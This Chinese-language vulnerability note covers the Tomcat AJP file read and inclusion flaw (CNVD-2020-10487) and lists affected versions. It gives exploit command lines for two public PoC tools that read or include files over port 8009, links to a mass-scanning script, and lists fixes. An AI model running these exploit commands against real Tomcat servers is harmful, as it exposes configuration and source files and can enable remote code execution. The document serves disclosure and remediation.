# Tomcat被曝出文件包含漏洞或导致RCE  

2020.02.21-CNVD-2020-10487-Tomcat-Ajp-lfi  
## 漏洞描述  
Apache Tomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器.默认情况下,Apache Tomcat会开启AJP连接器,方便与其他Web服务器通过AJP协议进行交互.但Apache Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的AJP请求,可以读取或者包含Web应用根目录下的任意文件,如果配合文件上传任意格式文件，将可能导致任意代码执行(RCE).该漏洞利用AJP服务端口实现攻击,未开启AJP服务对外不受漏洞影响（tomcat默认将AJP服务开启并绑定至0.0.0.0/0）  
## 影响范围  
Apache Tomcat = 6  
7 <= Apache Tomcat < 7.0.100  
8 <= Apache Tomcat < 8.5.51  
9 <= Apache Tomcat < 9.0.31  
  
## poc1  
1.参考链接（https://github.com/0nise/CVE-2020-1938）  
任意文件读取  
`java -jar 1.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 file /index.jsp`  
文件包含  
```java -jar 1.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 jsp /index.jsp```  
截图如下  
![漏洞截图](https://github.com/bmjoker/poc/blob/master/Tomcat/1.png)    
  
## poc2  
2.参考链接（https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi）  
任意文件读取
```py -2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1 -p 8009 -f WEB-INF/web.xml```  
![漏洞截图](https://github.com/bmjoker/poc/blob/master/Tomcat/2.png)  
  
于2020.03.02补充  
网上出现了批量刷取AJP漏洞的脚本  
参考链接：https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner

# 漏洞修复：  
* 临时禁用AJP协议端口，在conf/server.xm l配置文件中注释掉```<Connector port="8009" protocol="AJP/1.3"redirectPort="8443" />```   
* 配置ajp配置中的secretRequired跟secret属性来限制认证  
* 官方下载最新版下载地址：  
https://tomcat.apache.org/download-70.cgi  
https://tomcat.apache.org/download-80.cgi  
https://tomcat.apache.org/download-90.cgi  
https://github.com/apache/tomcat/releases  
# Reference  
https://github.com/threedr3am/learnjavabug  
https://www.cnvd.org.cn/flaw/show/CNVD-2020-10487  
https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ  
https://mp.weixin.qq.com/s/GMAR-KqcKPZyLe_D_WBdXA  
https://github.com/threedr3am/learnjavabug/blob/1f601a919605704e8e67b89213f233b82fa537c7/tomcat/ajp-bug/src/main/java/com/threedr3am/bug/tomcat/ajp/FileRead.java  
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/8bd38f4cf22331ecf4e48096a78c5931509c26be/CNVD-2020-10487-Tomcat-Ajp-lfi.py

